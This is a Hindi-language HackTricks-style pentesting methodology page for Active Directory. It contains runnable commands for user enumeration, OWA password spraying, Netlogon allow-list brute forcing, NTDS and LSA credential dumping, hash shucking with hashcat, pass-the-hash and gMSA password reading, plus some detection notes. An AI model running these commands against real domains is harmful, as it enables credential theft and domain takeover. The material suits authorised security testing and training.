# Active Directory कार्यप्रणाली

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी परिचय

**Active Directory** एक आधारभूत तकनीक है, जो **network administrators** को नेटवर्क के भीतर **domains**, **users** और **objects** को कुशलतापूर्वक बनाने और प्रबंधित करने में सक्षम बनाती है। इसे बड़े पैमाने पर काम करने के लिए बनाया गया है, ताकि बड़ी संख्या में users को प्रबंधनीय **groups** और **subgroups** में व्यवस्थित किया जा सके और विभिन्न स्तरों पर **access rights** नियंत्रित किए जा सकें।

**Active Directory** की संरचना में तीन मुख्य स्तर होते हैं: **domains**, **trees** और **forests**। **Domain** में एक ही database साझा करने वाले objects, जैसे **users** या **devices**, शामिल होते हैं। **Trees** ऐसे domains के समूह होते हैं जो एक साझा संरचना से जुड़े होते हैं, और **forest** कई trees का संग्रह होता है, जो **trust relationships** के ज़रिए आपस में जुड़े होते हैं और संगठनात्मक संरचना का सबसे ऊपरी स्तर बनाते हैं। इनमें से हर स्तर पर विशिष्ट **access** और **communication rights** निर्धारित किए जा सकते हैं।

**Active Directory** की प्रमुख अवधारणाएँ:

1. **Directory** – इसमें Active Directory objects से जुड़ी सभी जानकारी होती है।
2. **Object** – Directory की इकाइयों को दर्शाता है, जिनमें **users**, **groups** या **shared folders** शामिल हैं।
3. **Domain** – Directory objects के लिए एक container है। एक **forest** में कई domains हो सकते हैं, जिनमें से हर एक अपने objects का संग्रह बनाए रखता है।
4. **Tree** – ऐसे domains का समूह जो एक साझा root domain का इस्तेमाल करते हैं।
5. **Forest** – Active Directory की संगठनात्मक संरचना का सर्वोच्च स्तर, जिसमें कई trees होते हैं और उनके बीच **trust relationships** होते हैं।

**Active Directory Domain Services (AD DS)** में ऐसी कई सेवाएँ शामिल हैं जो नेटवर्क में केंद्रीकृत प्रबंधन और संचार के लिए अहम हैं। इन सेवाओं में शामिल हैं:

1. **Domain Services** – डेटा संग्रहण को केंद्रीकृत करती है और **users** तथा **domains** के बीच होने वाली गतिविधियों का प्रबंधन करती है, जिसमें **authentication** और **search** की सुविधाएँ भी शामिल हैं।
2. **Certificate Services** – सुरक्षित **digital certificates** बनाने, वितरित करने और प्रबंधित करने का काम करती है।
3. **Lightweight Directory Services** – **LDAP protocol** के ज़रिए directory-सक्षम applications को सहायता देती है।
4. **Directory Federation Services** – एक ही session में कई web applications पर users को authenticate करने के लिए **single-sign-on** की सुविधा देती है।
5. **Rights Management** – copyright सामग्री के अनधिकृत वितरण और इस्तेमाल को नियंत्रित करके उसकी सुरक्षा में मदद करती है।
6. **DNS Service** – **domain names** को resolve करने के लिए बेहद ज़रूरी है।

अधिक विस्तृत जानकारी के लिए देखें: [**TechTerms - Active Directory की परिभाषा**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

**AD पर attack** करने का तरीका जानने के लिए, आपको **Kerberos authentication process** को अच्छी तरह **समझना** होगा।\
[**अगर आपको अभी भी इसका काम करने का तरीका नहीं पता, तो यह पेज पढ़ें।**](kerberos-authentication.md)

## Cheat Sheet

AD को enumerate/exploit करने के लिए कौन-से commands चला सकते हैं, इसका त्वरित अवलोकन पाने के लिए आप [https://wadcoms.github.io/](https://wadcoms.github.io) पर जा सकते हैं।

> [!WARNING]
> Kerberos communication के लिए आम तौर पर **fully qualified domain name (FQDN)** ज़रूरी होता है, ताकि client सही SPN के लिए ticket प्राप्त कर सके। किसी machine को IP address से access करने पर अक्सर Kerberos के बजाय NTLM का इस्तेमाल होता है।

## Active Directory Recon (बिना creds/sessions के)

अगर आपको AD environment का access तो है, लेकिन आपके पास credentials/sessions नहीं हैं, तो आप:

- **नेटवर्क का pentest करें:**
  - नेटवर्क scan करें, machines और खुले ports ढूँढ़ें, फिर उनमें **vulnerabilities exploit** करने या उनसे **credentials extract** करने की कोशिश करें (उदाहरण के लिए, [printers बहुत दिलचस्प targets हो सकते हैं](ad-information-in-printers.md))।
  - DNS enumerate करने से domain के अहम servers, जैसे web, printers, shares, vpn, media आदि के बारे में जानकारी मिल सकती है।
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - इसे कैसे करना है, इस बारे में और जानकारी के लिए सामान्य [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) देखें।
- **smb services पर null और Guest access जाँचें** (यह Windows के आधुनिक versions पर काम नहीं करेगा):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - SMB server को enumerate करने के बारे में अधिक विस्तृत मार्गदर्शिका यहाँ मिल सकती है:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ldap enumerate करें**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - LDAP enumerate करने के बारे में अधिक विस्तृत मार्गदर्शिका यहाँ मिल सकती है (**anonymous access** पर खास ध्यान दें):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **नेटवर्क poison करें**
  - [**Responder के साथ services का impersonation करके**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) credentials इकट्ठा करें
  - [**relay attack का दुरुपयोग करके**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) host access करें
  - [**evil-S के साथ fake UPnP services expose करके**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) credentials इकट्ठा करें
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Domain environments के अंदर मौजूद और सार्वजनिक रूप से उपलब्ध internal documents, social media और services (मुख्यतः web) से usernames/names निकालें।
  - अगर आपको कंपनी के कर्मचारियों के पूरे नाम मिलें, तो आप AD के अलग-अलग **username conventions (**[**यह पढ़ें**](https://activedirectorypro.com/active-directory-user-naming-convention/)) आज़मा सकते हैं। सबसे आम conventions हैं: _NameSurname_, _Name.Surname_, _NamSur_ (हर नाम के 3letters), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters और 3 random numbers_ (abc123)।
  - Tools:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) और [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) पेज देखें।
- **Kerbrute enum**: जब **invalid username का अनुरोध किया जाता है**, तो server _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ **Kerberos error** code के साथ जवाब देता है, जिससे हम पता लगा सकते हैं कि username invalid था। **Valid usernames** पर जवाब में या तो **TGT in a AS-REP** मिलता है, या error _KRB5KDC_ERR_PREAUTH_REQUIRED_ मिलता है, जो बताता है कि user को pre-authentication करना होगा।
- **MS-NRPC के विरुद्ध No Authentication**: Domain controllers पर MS-NRPC (Netlogon) interface के विरुद्ध auth-level = 1 (No authentication) का इस्तेमाल करें। यह method MS-NRPC interface से bind करने के बाद `DsrGetDcNameEx2` function को call करता है, ताकि बिना credentials के जाँचा जा सके कि user या computer मौजूद है या नहीं। [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool इस तरह की enumeration लागू करता है। यह शोध [यहाँ](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> मिल सकता है।

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

अगर आपको network में इनमें से कोई server मिले, तो आप इसके विरुद्ध **user enumeration** भी कर सकते हैं। उदाहरण के लिए, आप [**MailSniper**](https://github.com/dafthack/MailSniper) tool का उपयोग कर सकते हैं:

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> आप usernames की सूचियाँ [**इस github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) और इस repo ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) में पा सकते हैं।
>
> हालांकि, आपके पास कंपनी में काम करने वाले लोगों के **नाम** होने चाहिए, जो आपने इससे पहले किए गए recon step से जुटाए होंगे। नाम और surname का उपयोग करके, संभावित मान्य usernames जनरेट करने के लिए आप [**namemash.py**](https://gist.github.com/superkojiman/11076951) script का उपयोग कर सकते हैं।

### Netlogon vulnerable-channel allow-list का दुरुपयोग (Onelogon)

DC पर **Zerologon** patch किए जाने के बाद भी, स्पष्ट रूप से allow-listed accounts **legacy/vulnerable Netlogon secure-channel behavior** के संपर्क में रह सकते हैं। जोखिम वाली configuration है GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** या इससे मेल खाने वाली registry value **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**।

यह value एक **SDDL security descriptor** है ([Security Descriptors](security-descriptors.md) देखें)। DACL में संबंधित ACE दिए गए किसी भी account या group को target किया जा सकता है। उदाहरण के लिए, `O:BAG:BAD:(A;;RC;;;WD)` प्रभावी रूप से **Everyone** को allow-list करता है।

व्यावहारिक operator workflow:

1. **SYSVOL/GPO** और **live DC registry**, दोनों की जाँच करके allow-listed principals की पहचान करें।
2. SDDL में मिले SIDs को वास्तविक AD users/computers से resolve करें और **DC machine accounts**, **trust accounts** तथा अन्य privileged machines को प्राथमिकता दें।
3. allow-listed account के रूप में बार-बार **MS-NRPC / Netlogon authentication** का प्रयास करें।
4. सही password का अनुमान लगने के बाद, target account का password reset करने के लिए **Netlogon password-setting** का दुरुपयोग करें (public PoC इसे empty string पर सेट करता है)।<sup>[[9]](#references)[[10]](#references)</sup>

Public artifact से quick triage / lab examples:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notes:

- **scanner** उपयोगी है, क्योंकि प्रभावी allow-list **SYSVOL**, **registry**, या दोनों में मौजूद हो सकती है।
- Exploit path महत्वपूर्ण है, क्योंकि किसी vulnerable account की पहचान हो जाने के बाद इसके लिए **Domain Admin privileges** की आवश्यकता **नहीं** होती।
- **Domain Controller machine account** जैसे `DC$` को compromise करना विशेष रूप से खतरनाक है, क्योंकि उसका password reset करने से सीधे व्यापक **AD takeover** के रास्ते खुल सकते हैं।
- **Brute-force की व्यवहार्यता** mode पर निर्भर करती है: सार्वजनिक artifact में meet-in-the-middle तरीका, कोई दूसरा computer account उपलब्ध होने पर **24-bit** brute force, और धीमे **32-bit** variants बताए गए हैं।

Detection / hardening notes:

- Allow-list policy का audit करें और अस्थायी, स्पष्ट रूप से आवश्यक compatibility exceptions के अलावा बाकी सब हटा दें।
- DC **System** events **5827/5828/5829/5830/5831** की निगरानी करें, ताकि vulnerable Netlogon connections को deny किए जाने, खोजे जाने या policy के तहत स्पष्ट रूप से allow किए जाने का पता चल सके।
- `VulnerableChannelAllowList` में मौजूद accounts को तब तक **high-risk** मानें, जब तक legacy dependency हटा न दी जाए।

### एक या कई usernames की जानकारी होना

ठीक है, तो आपको पता है कि आपके पास पहले से एक valid username है, लेकिन कोई password नहीं... फिर यह आज़माएँ:

- [**ASREPRoast**](asreproast.md): अगर किसी user के पास _DONT_REQ_PREAUTH_ attribute **नहीं है**, तो आप उस user के लिए **AS_REP message का अनुरोध** कर सकते हैं, जिसमें user के password के derivation से encrypted कुछ data होगा।
- [**Password Spraying**](password-spraying.md): चलिए, खोजे गए हर user के साथ सबसे **आम passwords** आज़माते हैं। हो सकता है कोई user कमजोर password इस्तेमाल कर रहा हो (password policy का ध्यान रखें!)।
  - ध्यान दें कि users के mail servers तक पहुँचने की कोशिश के लिए आप **OWA servers पर भी spray** कर सकते हैं।


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

आप network के कुछ protocols पर **poisoning** करके crack करने के लिए कुछ challenge **hashes प्राप्त** कर सकते हैं:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration से usernames, email identifiers और naming patterns, संभावित hosts, तथा वे services मिलती हैं जिन्हें authentication के लिए बाध्य किया जा सकता है। इस जानकारी का उपयोग करके व्यवहार्य NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) और AD environment में प्रवेश के संभावित रास्तों की पहचान करें।

### NetExec workspace-driven recon & relay posture checks

- हर engagement के लिए AD recon state बनाए रखने हेतु **`nxcdb` workspaces** का उपयोग करें: `workspace create <name>` `~/.nxc/workspaces/<name>` के अंतर्गत हर protocol के लिए SQLite DBs (smb/mssql/winrm/ldap/etc) बनाता है। `proto smb|mssql|winrm` से views बदलें और `creds` से जुटाए गए secrets की सूची देखें। काम पूरा होने पर sensitive data को मैन्युअल रूप से हटाएँ: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`** से तेज़ subnet discovery करने पर **domain**, **OS build**, **SMB signing requirements**, और **Null Auth** की जानकारी मिलती है। `(signing:False)` दिखाने वाले members **relay-prone** होते हैं, जबकि DCs को अक्सर signing की आवश्यकता होती है।
- Targeting आसान बनाने के लिए सीधे NetExec output से **/etc/hosts में hostnames बनाएँ**:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- यदि signing के कारण **DC पर SMB relay blocked** है, तब भी **LDAP** की स्थिति जाँचें: `netexec ldap <dc>` में `(signing:None)` / weak channel binding दिखता है। SMB signing अनिवार्य होने, लेकिन LDAP signing disabled होने वाला DC, **SPN-less RBCD** जैसे दुरुपयोगों के लिए अब भी एक viable **relay-to-LDAP** target है।

### Client-side printer credential leaks → बड़े पैमाने पर domain credential validation

- Printer/web UIs कभी-कभी **HTML में masked admin passwords embed करते हैं**। स्रोत/devtools देखने से cleartext दिख सकता है (जैसे, `<input value="<password>">`), जिससे Basic-auth के ज़रिए scan/print repositories तक पहुँच मिल सकती है।
- प्राप्त print jobs में **plaintext onboarding docs** हो सकते हैं, जिनमें प्रति-user passwords हों। परीक्षण के दौरान जोड़ियों को सही क्रम में रखें:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### NTLM Creds चुराना

अगर आप **null या guest user** से **दूसरे PCs या shares तक पहुँच सकते हैं**, तो आप **फ़ाइलें रख सकते हैं** (जैसे SCF file), जिन्हें किसी तरह access करने पर आपके विरुद्ध **NTLM authentication trigger** हो सकता है। इससे आप **NTLM challenge चुरा** सकते हैं और उसे crack कर सकते हैं:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking और NT-Candidate हमले

**Hash shucking** आपके पास मौजूद हर NT hash को अन्य, धीमे formats के लिए candidate password मानता है—उन formats की key material सीधे NT hash से derive होती है। Kerberos RC4 tickets, NetNTLM challenges या cached credentials में लंबे passphrases को brute-force करने के बजाय, NT hashes को Hashcat के NT-candidate modes में डालें। इससे password reuse को plaintext जाने बिना validate किया जा सकता है। यह domain compromise के बाद खास तौर पर असरदार है, जब आप हज़ारों मौजूदा और पुराने NT hashes इकट्ठा कर सकते हैं।<sup>[[5]](#references)</sup>

इसका इस्तेमाल करें, जब:

- आपके पास DCSync, SAM/SECURITY dumps या credential vaults से मिला NT corpus हो और दूसरे domains/forests में reuse जाँचना हो।
- आप RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses या DCC/DCC2 blobs capture करें।
- आप लंबे, crack न हो सकने वाले passphrases के reuse को जल्दी साबित करना चाहें और तुरंत Pass-the-Hash के ज़रिए pivot करना चाहें।

यह technique उन encryption types पर **काम नहीं करती** जिनकी keys NT hash नहीं होतीं (जैसे Kerberos etype 17/18 AES)। अगर domain में केवल AES लागू है, तो आपको सामान्य password modes पर लौटना होगा।

#### NT hash corpus तैयार करना

- **DCSync/NTDS** – NT hashes का सबसे बड़ा संभव set (और उनकी पिछली values) पाने के लिए history के साथ `secretsdump.py` का इस्तेमाल करें:

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  History entries candidate pool को काफी बढ़ा देते हैं, क्योंकि Microsoft हर account के लिए अधिकतम 24 पुराने hashes स्टोर कर सकता है। NTDS secrets को harvest करने के और तरीकों के लिए देखें:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (या Mimikatz `lsadump::sam /patch`) से local SAM/SECURITY data और cached domain logons (DCC/DCC2) निकालें। Duplicate हटाएँ और उन hashes को उसी `nt_candidates.txt` list में जोड़ें।
- **Metadata track करें** – हर hash से जुड़ा username/domain रखें (भले ही wordlist में केवल hex हो)। Hashcat के winning candidate दिखाने पर matching hashes तुरंत बताते हैं कि कौन-सा principal password दोबारा इस्तेमाल कर रहा है।
- shucking के दौरान overlap की संभावना बढ़ाने के लिए उसी forest या किसी trusted forest के candidates को प्राथमिकता दें।

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

नोट:

- NT-candidate inputs **raw 32-hex NT hashes ही रहने चाहिए**। Rule engines बंद रखें (`-r` नहीं, hybrid modes नहीं), क्योंकि mangling से candidate key material corrupt हो जाता है।
- ये modes अपने आप तेज़ नहीं होते, लेकिन NTLM keyspace (~30,000 MH/s on an M3 Max), Kerberos RC4 (~300 MH/s) से ~100× तेज़ है। Curated NT list को test करना, slow format में पूरे password space को explore करने से कहीं सस्ता है।
- हमेशा **latest Hashcat build** चलाएँ (`git clone https://github.com/hashcat/hashcat && make install`), क्योंकि modes 31500/31600/35300/35400 हाल ही में आए हैं।<sup>[[7]](#references)</sup>
- AS-REQ Pre-Auth के लिए फिलहाल कोई NT mode नहीं है, और AES etypes (19600/19700) के लिए plaintext password ज़रूरी है, क्योंकि उनकी keys raw NT hashes से नहीं, बल्कि UTF-16LE passwords से PBKDF2 के ज़रिए derive होती हैं।

#### उदाहरण – Kerberoast RC4 (mode 35300)

1. कम privileges वाले user से target SPN के लिए RC4 TGS capture करें (विवरण के लिए Kerberoast page देखें):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. अपनी NT list से ticket को Shuck करें:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat हर NT candidate से RC4 key निकालता है और `$krb5tgs$23$...` blob को validate करता है। Match मिलने से पुष्टि होती है कि service account आपके मौजूदा NT hashes में से किसी एक का उपयोग करता है।

3. तुरंत PtH के ज़रिए pivot करें:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   यदि ज़रूरत हो, तो बाद में `hashcat -m 1000 <matched_hash> wordlists/` से plaintext recover कर सकते हैं।

#### उदाहरण – Cached credentials (mode 31600)

1. Compromised workstation से cached logons dump करें:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. रुचिकर डोमेन यूज़र की DCC2 लाइन को `dcc2_highpriv.txt` में कॉपी करें और उसे shuck करें:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. सफल match से वह NT hash मिलता है जो आपकी सूची में पहले से ज्ञात है, जिससे साबित होता है कि cached user वही password दोबारा इस्तेमाल कर रहा है। इसे सीधे PtH के लिए इस्तेमाल करें (`nxc smb <dc_ip> -u highpriv -H <hash>`) या string वापस पाने के लिए fast NTLM mode में brute-force करें।

यही workflow NetNTLM challenge-responses (`-m 27000/27100`) और DCC (`-m 31500`) पर भी लागू होता है। Match मिलने पर आप relay, SMB/WMI/WinRM PtH चला सकते हैं या NT hash को masks/rules के साथ offline दोबारा crack कर सकते हैं।



## Credentials/session के साथ Active Directory की Enumeration

इस चरण के लिए आपके पास किसी वैध domain account के **compromised credentials या session होना चाहिए।** अगर आपके पास वैध credentials हैं या domain user के रूप में shell है, तो **याद रखें कि पहले दिए गए विकल्प अन्य users को compromise करने के लिए अब भी उपलब्ध हैं**।

Authenticated enumeration शुरू करने से पहले, **Kerberos double-hop problem** को समझें।


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

किसी account को compromise करना **domain का आकलन करने की दिशा में एक बड़ा कदम** है, क्योंकि इससे authenticated **Active Directory enumeration** संभव होती है:

[**ASREPRoast**](asreproast.md) के संदर्भ में अब आप हर संभावित vulnerable user को ढूँढ़ सकते हैं, और [**Password Spraying**](password-spraying.md) के संदर्भ में आप **सभी usernames की सूची** पा सकते हैं और compromised account का password, खाली passwords तथा नए संभावित passwords आज़मा सकते हैं।

- आप [**बुनियादी recon करने के लिए CMD**](../basic-cmd-for-pentesters.md#domain-info) इस्तेमाल कर सकते हैं।
- आप [**recon के लिए powershell**](../basic-powershell-for-pentesters/index.html) भी इस्तेमाल कर सकते हैं, जो अधिक stealthy होगा।
- अधिक विस्तृत जानकारी निकालने के लिए आप [**powerview इस्तेमाल**](../basic-powershell-for-pentesters/powerview.md) भी कर सकते हैं।
- Active Directory में recon के लिए एक और शानदार tool [**BloodHound**](bloodhound.md) है। यह **बहुत stealthy नहीं है** (आपके इस्तेमाल किए जाने वाले collection methods के आधार पर), लेकिन **अगर आपको इसकी परवाह नहीं है**, तो इसे ज़रूर आज़माएँ। पता लगाएँ कि users कहाँ RDP कर सकते हैं, दूसरे groups तक पहुँचने का path ढूँढ़ें, आदि।
  - **AD enumeration के अन्य automated tools हैं:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**AD के DNS records**](ad-dns-records.md) देखें, क्योंकि उनमें दिलचस्प जानकारी हो सकती है।
- Directory की enumeration के लिए आप **SysInternal** Suite का GUI वाला **AdExplorer.exe** tool इस्तेमाल कर सकते हैं।
- आप LDAP database में credentials खोजने के लिए **ldapsearch** का इस्तेमाल करके _userPassword_ और _unixUserPassword_ fields, या users के _description_ और _info_ notes भी देख सकते हैं। _info_ में ऐसा token जो label के बिना हो और password जैसा दिखे, सिर्फ़ एक संभावित password है: उसके उद्देश्य और वैधता की अलग से पुष्टि करें, और routine enumeration output में notes की सामग्री शामिल न करें। अन्य तरीकों के लिए PayloadsAllTheThings पर [AD User comment में Password](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) देखें।
- जब authorization इसकी अनुमति दे, तो `\\<dc>\NETLOGON` या `\\<dc>\SYSVOL\<domain>\scripts` के अंतर्गत **सुलभ** domain logon और drive-mapping scripts की समीक्षा करें। [Microsoft के दस्तावेज़](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) NETLOGON share की script-directory भूमिका बताते हैं। पहले names की सूची बनाएँ, फिर size limit के भीतर सिर्फ़ प्रासंगिक और पढ़ी जा सकने वाली scripts देखें; पूरी share dump न करें और routine enumeration के दौरान credential values echo न करें। [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) को call करने से script में रखा literal password **सुरक्षित नहीं हो जाता**। केवल इस call से यह साबित नहीं होता कि secret hardcoded है: इसके actual input को trace करें, फिर account, credential की वैधता और privileges की अलग से पुष्टि करें। Domain script की समीक्षा remote share की जाँच है, local host enumeration से अलग।
- अगर आप **Linux** इस्तेमाल कर रहे हैं, तो [**pywerview**](https://github.com/the-useless-one/pywerview) से भी domain enumerate कर सकते हैं।
- आप इन जैसे automated tools भी आज़मा सकते हैं:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **सभी domain users निकालना**

  Windows से सभी domain usernames पाना बहुत आसान है (`net user /domain` ,`Get-DomainUser` या `wmic useraccount get name,sid`)। Linux में आप यह इस्तेमाल कर सकते हैं: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` या `enum4linux -a -u "user" -p "password" <DC IP>`

> भले ही यह Enumeration section छोटा लगे, यह पूरे काम का सबसे महत्वपूर्ण हिस्सा है। links खोलें (खासकर cmd, powershell, powerview और BloodHound वाले), domain enumerate करना सीखें और तब तक अभ्यास करें जब तक आप इसमें सहज न हो जाएँ। Assessment के दौरान यही वह अहम क्षण होगा जब आप DA तक पहुँचने का रास्ता ढूँढ़ेंगे या तय करेंगे कि कुछ नहीं किया जा सकता।

### अनुमान लगाने योग्य पहले से बने computer accounts -> gMSA password तक पहुँच

Legacy joins के लिए पहले से तैयार किए गए computer accounts में अनुमान लगाने योग्य initial password रह सकता है। NetExec का `pre2k` module विशिष्ट `userAccountControl` value `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) पहचानता है और computer name के पहले 14 lowercase characters—अंतिम `$` के बिना—का इस्तेमाल करके Kerberos TGT पाने की कोशिश करता है। इस UAC value को संभावित candidates चुनने के लिए इस्तेमाल करें; सिर्फ़ **Pre-Windows 2000 Compatible Access** की membership को इस बात का प्रमाण न मानें कि password कमज़ोर है।<sup>[[18]](#references)[[20]](#references)</sup>

Candidates जाँचने और सफल TGTs सहेजने के लिए authenticated LDAP enumeration इस्तेमाल करें। `ALL=True` से जाँच default `4128` filter वाले objects से आगे तक होती है।<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

एक असफल default/NTLM bind इस finding को अमान्य **नहीं** करता: `-k`, ऐसा FQDN जो DC पर resolve होता हो, और KDC के साथ synchronized clock का इस्तेमाल करके जाँचें। सफल module runs candidate lists और acquired ccaches को `~/.nxc/modules/pre2k/` के नीचे लिखते हैं।<sup>[[18]](#references)[[20]](#references)</sup>

Computer principal को compromise करने के बाद, उसकी nested group memberships और outbound rights का पता लगाएँ। विशेष रूप से, gMSA के `msDS-GroupMSAMembership` security descriptor में नामित principals `msDS-ManagedPassword` पढ़ सकते हैं; NetExec का `--gmsa` output authorized principals दिखाता है और, जब authenticating computer अधिकृत हो, तो मौजूदा NT hash लौटाता है।<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

